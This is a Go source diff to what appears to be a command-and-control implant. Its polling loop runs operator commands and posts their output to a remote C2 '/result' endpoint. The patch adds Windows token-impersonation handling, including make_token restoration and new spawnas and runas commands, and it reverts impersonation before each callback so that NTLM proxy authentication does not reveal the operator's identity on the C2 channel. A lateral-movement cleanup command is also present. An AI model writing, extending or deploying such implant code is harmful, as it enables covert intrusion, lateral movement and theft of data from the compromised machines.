@@ -437,8 +437,17 @@ func pollOnce(
 	output, resultType := execute(reply.Command, cfg, client)
 	query := values(cfg)
 	query.Set("type", resultType)
+	// Revert thread impersonation before calling home. A Type 9 (make_token)
+	// token on the OS thread would be used by Windows for outbound auth,
+	// including NTLM proxy authentication, which would leak the operator
+	// identity to the C2 path. temporarilyRevertForCallback releases both
+	// the impersonation and the OS-thread lock so the HTTP call runs clean.
+	// reestablishThreadToken restores the token afterwards so subsequent
+	// operator commands stay authenticated.
+	temporarilyRevertForCallback()
 	_, err = request(client, cfg, http.MethodPost, "/result", query, []byte(output))
 	_ = register(client, cfg)
+	reestablishThreadToken()
 	return err
 }
 
@@ -507,6 +516,25 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		result, err := lateralCleanupCommand(trimmed)
 		if err != nil {
 			return "Lateral cleanup failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if strings.HasPrefix(trimmed, "__SPAWNAS__") {
+		result, err := spawnasCommand(trimmed, cfg)
+		// Step 4 of the cascade calls RevertToSelf before returning; restore
+		// the make_token impersonation so subsequent commands stay authenticated.
+		reestablishThreadToken()
+		if err != nil {
+			return "Spawnas failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if strings.HasPrefix(trimmed, "__RUNAS__") {
+		result, err := runasCommand(trimmed)
+		// Same: Step 4 reverts to self; restore if make_token was active.
+		reestablishThreadToken()
+		if err != nil {
+			return "Runas failed: " + err.Error(), "output"
 		}
 		return result, "output"
 	}
@@ -680,6 +708,9 @@ func runCommand(command string) (string, string) {
 	child := newCommand(name, args...)
 	applyCommandToken(child)
 	out, err := child.CombinedOutput()
+	// CreateProcessAsUserW may have reverted the creating thread's impersonation;
+	// restore it so subsequent operator commands stay authenticated.
+	reestablishThreadToken()
 	if err != nil {
 		return string(out) + "\n" + err.Error(), "output"
 	}
